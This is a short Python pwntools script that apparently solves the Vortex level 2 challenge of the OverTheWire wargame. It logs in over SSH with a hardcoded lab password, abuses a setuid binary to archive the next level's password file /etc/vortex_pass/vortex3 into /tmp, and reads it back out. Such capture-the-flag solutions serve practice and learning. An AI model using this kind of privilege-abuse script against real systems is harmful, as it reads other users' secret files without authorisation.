from pwn import *
import pwnlib.log

s = ssh(host='vortex.labs.overthewire.org', user='vortex2', password='23anbT\\rE')
s.run('/vortex/vortex2 /etc/vortex_pass/vortex3')
passwd = s.tar('xOf', "'/tmp/ownership.$$.tar'")

log.success('Password: {}'.format(passwd))
